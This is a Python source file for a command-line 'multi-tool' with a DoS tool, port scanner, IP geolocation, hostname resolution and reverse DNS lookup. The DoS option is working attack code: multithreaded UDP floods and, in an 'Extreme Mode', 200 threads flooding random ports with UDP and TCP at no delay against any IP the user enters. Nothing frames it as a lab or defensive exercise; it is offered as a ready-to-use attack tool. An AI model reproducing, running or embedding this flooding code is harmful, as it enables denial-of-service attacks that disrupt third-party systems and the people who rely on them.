
import threading
import socket
import random
import time
import os
import requests
from colorama import init, Fore, Style
from tqdm import tqdm

# Initialize colorama
init(autoreset=True)

def gradient_line(text, color_code):
    return f"\033[38;5;{color_code}m{text}\033[0m"

def main_menu():
    os.system('cls' if os.name == 'nt' else 'clear')

    banner_lines = [
        "              _                         _ _   _       _              _ ",
        "__   ___   _| |_ ___   _ __ ___  _   _| | |_(_)     | |_ ___   ___ | |",
        "\\ \\ / / | | | __/ __| | '_ ` _ \\| | | | | __| |_____| __/ _ \\ / _ \\| |",
        " \\ V /| |_| | |_\\__ \\ | | | | | | |_| | | |_| |_____| || (_) | (_) | |",
        "  \\_/  \\__, |\\__|___/ |_| |_| |_|\\__,_|_|\\__|_|      \\__\\___/ \\___/|_|",
        "       |___/                                                          ",
    ]
    gradient_colors = [17, 18, 19, 20, 27, 33]
    print()
    for line, color in zip(banner_lines, gradient_colors):
        print(gradient_line(line, color))

    print ("----------------------------------------------------------------------")
    print(Fore.WHITE + "1. DoS Tool")
    print("2. IP Geolocation Tool")
    print("3. Port Scanner")
    print("4. Website IP Resolver")
    print("5. Reverse DNS Lookup")
    print(Fore.RED + "6. Exit")
    choice = input("\nChoose an option: ")

    if choice == "1":
        dos_tool()
    elif choice == "2":
        ip_geolocation()
    elif choice == "3":
        port_scanner()
    elif choice == "4":
        ip_resolver()
    elif choice == "5":
        reverse_dns()
    elif choice == "6":
        print(Fore.CYAN + "Goodbye!")
        exit()
    else:
        print(Fore.RED + "Invalid choice. Try again.")

def dos_tool():
    print("\n=== DoS Tool (with Extreme Mode) ===")
    ip = input("Target IP: ").strip()
    port = int(input("Target Port (used in normal mode only): ").strip())
    extreme_mode = input("Enable Extreme Mode? (y/n): ").strip().lower() == "y"

    if extreme_mode:
        print(Fore.RED + Style.BRIGHT + "\n🔥 Extreme Mode ENABLED.\n")
        packets_per_thread = 10000
        threads_count = 200
        delay = 0
    else:
        packets_per_thread = int(input("Number of packets per thread: ").strip())
        threads_count = int(input("Number of threads: ").strip())
        print("Speed options: [1] Fast  [2] Extremely Fast")
        delay = 0.01 if input("Choose speed (1 or 2): ").strip() == "1" else 0

    counter_lock = threading.Lock()
    total_sent = [0]

    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(1024)
        for _ in tqdm(range(packets_per_thread), desc="Sending UDP packets", leave=False):
            try:
                target_port = random.randint(1, 65535) if extreme_mode else port
                sock.sendto(bytes_to_send, (ip, target_port))
                with counter_lock:
                    total_sent[0] += 1
            except:
                continue
            if delay > 0:
                time.sleep(delay)
        sock.close()

    def tcp_flood():
        for _ in tqdm(range(packets_per_thread // 10), desc="Sending TCP packets", leave=False):
            try:
                target_port = random.randint(1, 65535)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, target_port))
                sock.send(random._urandom(1024))
                with counter_lock:
                    total_sent[0] += 1
                sock.close()
            except:
                continue
            if delay > 0:
                time.sleep(delay)

    def show_counter():
        while any(t.is_alive() for t in all_threads):
            with counter_lock:
                print(Fore.CYAN + f"\r[+] Packets sent: {total_sent[0]}", end="")
            time.sleep(0.2)
        print(Fore.CYAN + f"\r[+] Packets sent: {total_sent[0]} (final)\n")

    all_threads = []
    for _ in range(threads_count):
        udp_thread = threading.Thread(target=udp_flood)
        all_threads.append(udp_thread)
        udp_thread.start()
        if extreme_mode:
            tcp_thread = threading.Thread(target=tcp_flood)
            all_threads.append(tcp_thread)
            tcp_thread.start()

    monitor = threading.Thread(target=show_counter)
    monitor.start()

    for t in all_threads:
        t.join()
    monitor.join()

    print(Fore.GREEN + "\nDone! All threads finished.")
    input("\nPress Enter to return to the menu...")

def port_scanner():
    print("\n=== Port Scanner ===")
    target = input("Enter target (e.g., 127.0.0.1 or google.com): ").strip()
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
        3306: "MySQL", 8080: "HTTP-ALT"
    }
    print(f"\nScanning {target}...\n")
    for port, service in tqdm(common_ports.items(), desc="Scanning ports"):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            try:
                if s.connect_ex((target, port)) == 0:
                    print(f"[OPEN] Port {port} ({service})")
            except:
                break
    input("\nPress Enter to return to the menu...")

def ip_resolver():
    print("\n=== Website IP Resolver ===")
    website = input("Enter website (e.g., google.com): ").strip()
    try:
        ip = socket.gethostbyname(website)
        print(f"The IP address of {website} is: {ip}")
    except socket.gaierror:
        print("Failed to resolve. Make sure the website is valid.")
    input("\nPress Enter to return to the menu...")

def ip_geolocation():
    print("\n=== IP Geolocation Tool ===")
    ip = input("Enter IP address: ").strip()
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        if res['status'] == 'success':
            print(Fore.GREEN + f"\n[+] IP: {res['query']}")
            print(f"    Location: {res['city']}, {res['regionName']}, {res['country']}")
            print(f"    ISP: {res['isp']}")
            print(f"    Org: {res['org']}")
            print(f"    Lat/Lon: {res['lat']}, {res['lon']}")
        else:
            print(Fore.RED + "[!] Lookup failed.")
    except:
        print(Fore.RED + "[!] Error fetching data.")
    input("\nPress Enter to return to the menu...")

def reverse_dns():
    print("\n=== Reverse DNS Lookup ===")
    ip = input("Enter IP address: ").strip()
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        print(Fore.GREEN + f"[+] Hostname: {hostname}")
    except:
        print(Fore.RED + "[!] Reverse DNS lookup failed.")
    input("\nPress Enter to return to the menu...")

if __name__ == "__main__":
    while True:
        main_menu()
